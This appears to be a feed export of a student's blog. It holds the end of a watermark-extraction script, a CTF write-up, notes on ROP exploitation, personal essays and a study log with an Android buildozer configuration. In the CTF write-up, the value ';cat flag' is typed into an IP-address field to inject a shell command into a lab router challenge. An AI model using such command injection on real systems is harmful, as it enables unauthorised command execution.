        plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>yticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> oldseed<span class="token punctuation">:</span> random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>seed<span class="token punctuation">,</span>version<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span> random<span class="token punctuation">.</span>seed<span class="token punctuation">(</span>seed<span class="token punctuation">)</span>
    m<span class="token punctuation">,</span> n <span class="token operator">=</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>img<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token builtin">list</span><span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>img<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> oldseed<span class="token punctuation">:</span>
        random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>m<span class="token punctuation">,</span>random<span class="token operator">=</span>random<span class="token punctuation">.</span>random<span class="token punctuation">)</span>
        random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>n<span class="token punctuation">,</span>random<span class="token operator">=</span>random<span class="token punctuation">.</span>random<span class="token punctuation">)</span>
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>m<span class="token punctuation">)</span>
        random<span class="token punctuation">.</span>shuffle<span class="token punctuation">(</span>n<span class="token punctuation">)</span>

    f1 <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img<span class="token punctuation">)</span>
    f2 <span class="token operator">=</span> np<span class="token punctuation">.</span>fft<span class="token punctuation">.</span>fft2<span class="token punctuation">(</span>img_wm<span class="token punctuation">)</span>

    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
        plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">232</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>bgr_to_rgb<span class="token punctuation">(</span>np<span class="token punctuation">.</span>real<span class="token punctuation">(</span>f1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> \
            plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'fft(image)'</span><span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>yticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">235</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>bgr_to_rgb<span class="token punctuation">(</span>np<span class="token punctuation">.</span>real<span class="token punctuation">(</span>f1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> \
            plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'fft(image(encoded))'</span><span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>yticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    rwm <span class="token operator">=</span> <span class="token punctuation">(</span>f2 <span class="token operator">-</span> f1<span class="token punctuation">)</span> <span class="token operator">/</span> alpha
    rwm <span class="token operator">=</span> np<span class="token punctuation">.</span>real<span class="token punctuation">(</span>rwm<span class="token punctuation">)</span>

    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
        plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">233</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>bgr_to_rgb<span class="token punctuation">(</span>rwm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> \
            plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'encrypted(watermark)'</span><span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>yticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    wm <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            wm<span class="token punctuation">[</span>m<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">[</span>n<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">=</span> np<span class="token punctuation">.</span>uint8<span class="token punctuation">(</span>rwm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token number">0.5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            wm<span class="token punctuation">[</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span>rwm<span class="token punctuation">.</span>shape<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">-</span> j <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> wm<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span>
    <span class="token keyword">assert</span> cv2<span class="token punctuation">.</span>imwrite<span class="token punctuation">(</span>fn3<span class="token punctuation">,</span> wm<span class="token punctuation">)</span>

    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
        plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">236</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>imshow<span class="token punctuation">(</span>bgr_to_rgb<span class="token punctuation">(</span>wm<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">u'watermark'</span><span class="token punctuation">)</span>
        plt<span class="token punctuation">.</span>xticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">,</span> plt<span class="token punctuation">.</span>yticks<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

    <span class="token keyword">if</span> debug<span class="token punctuation">:</span>
        plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>复现</tag>
      </tags>
  </entry>
  <entry>
    <title>bjdctf_2020_router</title>
    <url>/2022/012191aa.html</url>
    <content><![CDATA[<span id="more"></span>
<h2 id="刷新三观第一题-bjdctf-2020-router"><a href="#刷新三观第一题-bjdctf-2020-router" class="headerlink" title="刷新三观第一题(bjdctf_2020_router)"></a>刷新三观第一题(bjdctf_2020_router)</h2><p><del>昨天本来已经没想到，但今天更没想到</del></p>
<p>这是一个考察linux中命令方式的题，直接就不需要IDA查看文件</p>
<p>Linux中打开，连接靶机</p>
<p><img src="/img/1643120285905.png" alt="1643120285905"></p>
<p>界面就这样，让你选</p>
<p>我选了1</p>
<p><img src="/img/1643120297383.png" alt="1643120297383"></p>
<p>然后让我输入ip地址，我觉得有猫腻，想到Linux有一个指令用法</p>
<p><code>命令1+；+命令2</code> 这样的格式两种指令都会执行</p>
<p>然后我果断;cat flag</p>
<p><img src="/img/1643120311348.png" alt="1643120311348"></p>
<p>哈哈哈，出来了，<del>放在第二页可真是有含金量</del></p>
<p>下班！</p>
]]></content>
      <categories>
        <category>writeup</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title>基本ROP</title>
    <url>/2021/0620e4d6.html</url>
    <content><![CDATA[<h1 id="基本ROP"><a href="#基本ROP" class="headerlink" title="基本ROP"></a>基本ROP</h1><p>随着 NX 保护的开启，以往直接向栈或者堆上直接注入代码的方式难以继续发挥效果。攻击者们也提出来相应的方法来绕过保护，目前主要的是 ROP(Return Oriented Programming)，其主要思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。所谓 gadgets 就是以 ret 结尾的指令序列，通过这些指令序列，我们可以修改某些地址的内容，方便控制程序的执行流程。</p>
<p>之所以称之为 ROP，是因为核心在于利用了指令集中的 ret 指令，改变了指令流的执行顺序。ROP 攻击一般得满足如下条件</p>
<pre><code>程序存在溢出，并且可以控制返回地址。

可以找到满足条件的 gadgets 以及相应 gadgets 的地址。
</code></pre>
<p>如果 gadgets 每次的地址是不固定的，那我们就需要想办法动态获取对应的地址了。</p>
<h2 id="ret2text"><a href="#ret2text" class="headerlink" title="ret2text"></a>ret2text</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>ret2text 即控制程序执行程序本身已有的的代码 (.text)。其实，这种攻击方法是一种笼统的描述。我们控制执行程序已有的代码的时候也可以控制程序执行好几段不相邻的程序已有的代码 (也就是 gadgets)，这就是我们所要说的 ROP。</p>
<p>这时，我们需要知道对应返回的代码的位置。当然程序也可能会开启某些保护，我们需要想办法去绕过这些保护。</p>
<h2 id="ret2shellcode"><a href="#ret2shellcode" class="headerlink" title="ret2shellcode"></a>ret2shellcode</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p>
<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>ret2syscall，即控制程序执行系统调用，获取 shell。</p>
<h2 id="ret2libc"><a href="#ret2libc" class="headerlink" title="ret2libc"></a>ret2libc</h2><h3 id="原理-3"><a href="#原理-3" class="headerlink" title="原理"></a>原理</h3><p>ret2libc 即控制函数的执行 libc 中的函数，通常是返回至某个函数的 plt 处或者函数的具体位置 (即函数对应的 got 表项的内容)。一般情况下，我们会选择执行 system(“/bin/sh”)，故而此时我们需要知道 system 函数的地址。</p>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>飞蓬大将军</title>
    <url>/2021/0617a66d.html</url>
    <content><![CDATA[<span id="more"></span>
<h3 id="又是一年夏天，又是一年仙剑"><a href="#又是一年夏天，又是一年仙剑" class="headerlink" title="又是一年夏天，又是一年仙剑"></a>又是一年夏天，又是一年仙剑</h3><p>九叶重楼二两，冬至蝉蛹一钱，加入隔年雪，可医世人相思疾苦，可重楼七叶枝一枝花，冬至何来蝉蛹，雪又怎能隔年，原是相思无解。</p>
<p>哪来相思无解？九叶重楼可培育，蚕蛹在温室也不是不能活但冬至，今年雪放到冰箱明年用，其实一切都能实现，就是代价更大，说是无解，其是不解而已，忘掉她不如思念她，既见随念。</p>
]]></content>
      <categories>
        <category>日常闲话</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>大一生活结束了</title>
    <url>/2021/09289e01.html</url>
    <content><![CDATA[<h2 id="大一总结："><a href="#大一总结：" class="headerlink" title="大一总结："></a>大一总结：</h2><p>   2020年9月21日，是我第一天到新疆大学报道的日子，怀着憧憬和忐忑的心，我正式成为了一名网安的学生。其实刚到大学，脑子里只有一股念想： 怎么在大学四年里过得充实。<br>   要我说，真正让我开始感到大学意义的便是ctf。刚开学，社团招新，本着我对计算机方面的强烈兴趣，我不假思索的选择了新疆大学网络安全兴趣协会，从那时起，我才开始逐渐了解有一项比赛叫ctf，里面很多方向，涉及很多的计算机知识、专业领域。就觉得缘分挺奇妙的，我一看见这个东西，就爱上它了。往往是因为热爱，才让很多人能够变得优秀。从“1024”的招新赛之后，我便一发不可收拾，开始越来越想了解ctf比赛，终于大一上寒假，一个很好的培训机会，我正式开始了我的ctf之路，学习汇编、pthon，开始入门pwn方向，众所周知，pwn方向是选择较少但又很大头的一个方向，不单单是因为入门门槛高，更是因为它乏味。多少次刷题刷到不想刷的时候，都是依靠着我的兴趣在不断坚持。暑假是一个非常好的时期，三个月的长假，足够一个菜鸟变成大菜鸟(bushi)。终于在暑假考核赛中，我展露了锋芒。不过这也只是刚刚开始，pwn需要沉淀，我也是。</p>
<hr>
<p>   生活总是百般刁难，虽然我对ctf拥有足够多的热爱，但是仍然避免不了我的平庸。大一的课程，确实让我不知所措，上册初来乍到，没有追求过绩点高低，等到下册想来时，却遇上了大劫难。为了新校区的搬迁，我们的课程排满了，每天都是高强度的上课上课，自己所有的节奏都被打乱，强压之下喘不过气，最后落下了一个非常不好的结局。不是很想再提，不管是老师的教学问题还是我本人的问题，反正结局已定，也无可厚非了。只是从大二开始，一定不能再浑浑噩噩过日子了，这一学年遇到的人和事也都当历练了，人哪有不走弯路的，任何人的一生也不可能是一帆风顺的，只要认识问题及时改正，我就还有机会做个好人，哈哈哈哈。</p>
<hr>
<p>   很荣幸能在第一批新生中就加入XJUSEC。可以说我一直是一个人，在我们班上，我是唯一一个打ctf的，在ctf中，我是唯一一个学pwn的新生，种种孤独都向我而来，我接受孤独，享受孤独。都说站在顶峰的人才会享受孤独，但我这也不算吧哈哈哈哈。战队是一个大家庭，学长们人都很好，好说话，好相处，我觉得我没来错地方，挺好的。我们萌新们也都算是志同道合了，不然不会这么聊得来。一转眼就大二了，时间不等人，开学就要迎接新生，招他们入会了，芜湖！</p>
<hr>
<h2 id="大二展望："><a href="#大二展望：" class="headerlink" title="大二展望："></a>大二展望：</h2><p>   真是，大二了，很幸运12.18我能参加四级考试，争取一次过四级，后面才好过六级，早早为考研做准备吧！</p>
<p>   大二了，过了一年大学生活，我也算是活明白了，现在起，拒绝懒惰，拒绝无用功，好好学习，扎实基础，保研肯定是不用想的，但是考研肯定是要做的。这不国庆快到了，安排了一些计划：</p>
<pre><code>1.复习大一学的不牢靠的课程知识（必须）
2.继续buu刷题，看书学pwn（看时间够不）
3.把没了的暑假作业了了（一定）
</code></pre>
<p>   我要再不努力，耶稣也救不了我了！！！<br>   等开学后，准备找学长和咱宿舍的兄弟们做个大创项目啥的，先把创新学分拿下吧，那200个学时咱再慢慢争。然后就是，打比赛！打比赛！打比赛！拿奖！拿奖！拿奖！</p>
<p>   希望我的大二学年能够照着计划稳稳走完。大一就当混了，大二绝不做混子！我要洗心革面，做个好人!</p>
]]></content>
      <categories>
        <category>日常闲话</category>
      </categories>
      <tags>
        <tag>生活</tag>
      </tags>
  </entry>
  <entry>
    <title>寒假学习(一)</title>
    <url>/2022/01225bd0.html</url>
    <content><![CDATA[<span id="more"></span>
<h1 id="学习进度总结（一）（2022-1-17-2022-1-23）"><a href="#学习进度总结（一）（2022-1-17-2022-1-23）" class="headerlink" title="学习进度总结（一）（2022.1.17-2022.1.23）"></a>学习进度总结（一）（2022.1.17-2022.1.23）</h1><h2 id="作品赛项目Begin"><a href="#作品赛项目Begin" class="headerlink" title="作品赛项目Begin"></a>作品赛项目Begin</h2><p>13号回家后休息了两天就开始着手正事——创新实践作品赛</p>
<ul>
<li><p>第一次做作品赛项目，说实在的挺无从下手，因为什么经验也没有，先就是组队问题，既然说要实验室成员组队优先，那就熟人组队了。</p>
</li>
<li><p>组好队后开始讨论作品内容，商量半天想到了三个比较好的方案，最后经过讨论，确定下来题目：<strong>手机诈骗钓鱼软件的伪通讯录及ip地址生成</strong></p>
</li>
<li><p>内容确定，大致是要做一个手机app，于是第一个碰上的比较陌生的问题就是安卓打包，我们决定主要用python语言进行编写，找到最好的就是用python的kivy库进行编写，正好有配套的buildozer可以进行软件打包</p>
</li>
<li><p>说干就干，队伍分工，首先让我这个擅长debug的开始着手外包工作，软件打包。果不其然，一开始下载好buildozer就开始报错了，全是bug，一片红，可给我看得头大，慢慢debug吧，是个漫长的过程</p>
</li>
<li><p>经过两天两夜的辛苦debug，遇到最后一个最大的问题就是打包后的软件下载后打开闪退，终于在第三天，传来捷报！外包成功了，进度+1<del>哈哈哈哈</del>！</p>
</li>
<li><p>最强指令：</p>
<pre class="line-numbers language-none"><code class="language-none">buildozer -v android debug run<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li>
<li><p> 留下buildozer.spec文件的配置 </p>
</li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">[app]

# (str) Title of your application
title &#x3D; 

# (str) Package name
package.name &#x3D; myapp

# (str) Package domain (needed for android&#x2F;ios packaging)
package.domain &#x3D; org.myapp

# (str) Source code where the main.py live
source.dir &#x3D; 

# (list) Source files to include (let empty to include all the files)
source.include_exts &#x3D; py,png,jpg,kv,atlas

# (list) List of inclusions using pattern matching
#source.include_patterns &#x3D; assets&#x2F;*,images&#x2F;*.png

# (list) Source files to exclude (let empty to not exclude anything)
#source.exclude_exts &#x3D; spec

# (list) List of directory to exclude (let empty to not exclude anything)
#source.exclude_dirs &#x3D; tests, bin

# (list) List of exclusions using pattern matching
#source.exclude_patterns &#x3D; license,images&#x2F;*&#x2F;*.jpg

# (str) Application versioning (method 1)
version &#x3D; 0.1

# (str) Application versioning (method 2)
# version.regex &#x3D; __version__ &#x3D; [&#39;&quot;](.*)[&#39;&quot;]
# version.filename &#x3D; %(source.dir)s&#x2F;main.py

# (list) Application requirements
# comma separated e.g. requirements &#x3D; sqlite3,kivy
requirements &#x3D; hostpython3, libffi, openssl, sdl2_image, sdl2_mixer, sdl2_ttf, sqlite3, python3, sdl2, setuptools, six, pyjnius, android, kivy, requests, kivy.app, certifi

# (str) Custom source folders for requirements
# Sets custom source for any requirements with recipes
# requirements.source.kivy &#x3D; ..&#x2F;..&#x2F;kivy

# (list) Garden requirements
#garden_requirements &#x3D;

# (str) Presplash of the application
#presplash.filename &#x3D; %(source.dir)s&#x2F;data&#x2F;presplash.png

# (str) Icon of the application
#icon.filename &#x3D; %(source.dir)s&#x2F;icon.png

# (str) Supported orientation (one of landscape, sensorLandscape, portrait or all)
orientation &#x3D; portrait

# (list) List of service to declare
#services &#x3D; NAME:ENTRYPOINT_TO_PY,NAME2:ENTRYPOINT2_TO_PY

#
# OSX Specific
#

#
# author &#x3D; © Copyright Info

# change the major version of python used by the app
osx.python_version &#x3D; 3

# Kivy version to use
osx.kivy_version &#x3D; 1.9.0

#
# Android specific
#

# (bool) Indicate if the application should be fullscreen or not
fullscreen &#x3D; 0

# (string) Presplash background color (for new android toolchain)
# Supported formats are: #RRGGBB #AARRGGBB or one of the following names:
# red, blue, green, black, white, gray, cyan, magenta, yellow, lightgray,
# darkgray, grey, lightgrey, darkgrey, aqua, fuchsia, lime, maroon, navy,
# olive, purple, silver, teal.
#android.presplash_color &#x3D; #FFFFFF

# (string) Presplash animation using Lottie format.
# see https:&#x2F;&#x2F;lottiefiles.com&#x2F; for examples and https:&#x2F;&#x2F;airbnb.design&#x2F;lottie&#x2F;
# for general documentation.
# Lottie files can be created using various tools, like Adobe After Effect or Synfig.
#android.presplash_lottie &#x3D; &quot;path&#x2F;to&#x2F;lottie&#x2F;file.json&quot;
 
# (str) Adaptive icon of the application (used if Android API level is 26+ at runtime)
#icon.adaptive_foreground.filename &#x3D; %(source.dir)s&#x2F;data&#x2F;icon_fg.png
#icon.adaptive_background.filename &#x3D; %(source.dir)s&#x2F;data&#x2F;icon_bg.png

# (list) Permissions
android.permissions &#x3D; INTERNET

# (int) Target Android API, should be as high as possible.
#android.api &#x3D; 27

# (int) Minimum API your APK will support.
#android.minapi &#x3D; 21

# (int) Android SDK version to use
#android.sdk &#x3D; 20

# (str) Android NDK version to use
#android.ndk &#x3D; 19b

# (int) Android NDK API to use. This is the minimum API your app will support, it should usually match android.minapi.
#android.ndk_api &#x3D; 21

# (bool) Use --private data storage (True) or --dir public storage (False)
#android.private_storage &#x3D; True

# (str) Android NDK directory (if empty, it will be automatically downloaded.)
#android.ndk_path &#x3D;

# (str) Android SDK directory (if empty, it will be automatically downloaded.)
#android.sdk_path &#x3D;

# (str) ANT directory (if empty, it will be automatically downloaded.)
#android.ant_path &#x3D;

# (bool) If True, then skip trying to update the Android sdk
# This can be useful to avoid excess Internet downloads or save time
# when an update is due and you just want to test&#x2F;build your package
# android.skip_update &#x3D; False

# (bool) If True, then automatically accept SDK license
# agreements. This is intended for automation only. If set to False,
# the default, you will be shown the license when first running
# buildozer.
# android.accept_sdk_license &#x3D; False

# (str) Android entry point, default is ok for Kivy-based app
#android.entrypoint &#x3D; org.renpy.android.PythonActivity

# (str) Android app theme, default is ok for Kivy-based app
# android.apptheme &#x3D; &quot;@android:style&#x2F;Theme.NoTitleBar&quot;

# (list) Pattern to whitelist for the whole project
#android.whitelist &#x3D;

# (str) Path to a custom whitelist file
#android.whitelist_src &#x3D;

# (str) Path to a custom blacklist file
#android.blacklist_src &#x3D;

# (list) List of Java .jar files to add to the libs so that pyjnius can access
# their classes. Don&#39;t add jars that you do not need, since extra jars can slow
# down the build process. Allows wildcards matching, for example:
# OUYA-ODK&#x2F;libs&#x2F;*.jar
#android.add_jars &#x3D; foo.jar,bar.jar,path&#x2F;to&#x2F;more&#x2F;*.jar

# (list) List of Java files to add to the android project (can be java or a
# directory containing the files)
#android.add_src &#x3D;

# (list) Android AAR archives to add (currently works only with sdl2_gradle
# bootstrap)
#android.add_aars &#x3D;

# (list) Gradle dependencies to add (currently works only with sdl2_gradle
# bootstrap)
#android.gradle_dependencies &#x3D;

# (list) add java compile options
# this can for example be necessary when importing certain java libraries using the &#39;android.gradle_dependencies&#39; option
# see https:&#x2F;&#x2F;developer.android.com&#x2F;studio&#x2F;write&#x2F;java8-support for further information
# android.add_compile_options &#x3D; &quot;sourceCompatibility &#x3D; 1.8&quot;, &quot;targetCompatibility &#x3D; 1.8&quot;

# (list) Gradle repositories to add &#123;can be necessary for some android.gradle_dependencies&#125;
# please enclose in double quotes 
# e.g. android.gradle_repositories &#x3D; &quot;maven &#123; url &#39;https:&#x2F;&#x2F;kotlin.bintray.com&#x2F;ktor&#39; &#125;&quot;
#android.add_gradle_repositories &#x3D;

# (list) packaging options to add 
# see https:&#x2F;&#x2F;google.github.io&#x2F;android-gradle-dsl&#x2F;current&#x2F;com.android.build.gradle.internal.dsl.PackagingOptions.html
# can be necessary to solve conflicts in gradle_dependencies
# please enclose in double quotes 
# e.g. android.add_packaging_options &#x3D; &quot;exclude &#39;META-INF&#x2F;common.kotlin_module&#39;&quot;, &quot;exclude &#39;META-INF&#x2F;*.kotlin_module&#39;&quot;
#android.add_gradle_repositories &#x3D;

# (list) Java classes to add as activities to the manifest.
#android.add_activities &#x3D; com.example.ExampleActivity

# (str) OUYA Console category. Should be one of GAME or APP
# If you leave this blank, OUYA support will not be enabled
#android.ouya.category &#x3D; GAME

# (str) Filename of OUYA Console icon. It must be a 732x412 png image.
#android.ouya.icon.filename &#x3D; %(source.dir)s&#x2F;data&#x2F;ouya_icon.png

# (str) XML file to include as an intent filters in &lt;activity&gt; tag
#android.manifest.intent_filters &#x3D;

# (str) launchMode to set for the main activity
#android.manifest.launch_mode &#x3D; standard

# (list) Android additional libraries to copy into libs&#x2F;armeabi
#android.add_libs_armeabi &#x3D; libs&#x2F;android&#x2F;*.so
#android.add_libs_armeabi_v7a &#x3D; libs&#x2F;android-v7&#x2F;*.so
#android.add_libs_arm64_v8a &#x3D; libs&#x2F;android-v8&#x2F;*.so
#android.add_libs_x86 &#x3D; libs&#x2F;android-x86&#x2F;*.so
#android.add_libs_mips &#x3D; libs&#x2F;android-mips&#x2F;*.so

# (bool) Indicate whether the screen should stay on
# Don&#39;t forget to add the WAKE_LOCK permission if you set this to True
#android.wakelock &#x3D; False

# (list) Android application meta-data to set (key&#x3D;value format)
#android.meta_data &#x3D;

# (list) Android library project to add (will be added in the
# project.properties automatically.)
#android.library_references &#x3D;

# (list) Android shared libraries which will be added to AndroidManifest.xml using &lt;uses-library&gt; tag
#android.uses_library &#x3D;

# (str) Android logcat filters to use
#android.logcat_filters &#x3D; *:S python:D

# (bool) Copy library instead of making a libpymodules.so
#android.copy_libs &#x3D; 1

# (str) The Android arch to build for, choices: armeabi-v7a, arm64-v8a, x86, x86_64
android.arch &#x3D; armeabi-v7a

# (int) overrides automatic versionCode computation (used in build.gradle)
# this is not the same as app version and should only be edited if you know what you&#39;re doing
# android.numeric_version &#x3D; 1

#(bool) enables Android auto backup feature (Android API &gt;&#x3D;23)
android.allow_backup &#x3D; True

#(str) XML file for custom backup rules (see official auto backup documentation)
#android.backup_rules &#x3D;

#(str) If you need to insert variables into your AndroidManifest.xml file,
#you can do so with the manifestPlaceholders property.
#This property takes a map of key-value pairs. (via a string)
#Usage example : android.manifest_placeholders &#x3D; [myCustomUrl:&quot;org.kivy.customurl&quot;]
#android.manifest_placeholders &#x3D; [:]

#(bool) disables the compilation of py to pyc&#x2F;pyo files when packaging
#android.no-compile-pyo &#x3D; True

#
# Python for android (p4a) specific
#

# (str) python-for-android fork to use, defaults to upstream (kivy)
#p4a.fork &#x3D; kivy

# (str) python-for-android branch to use, defaults to master
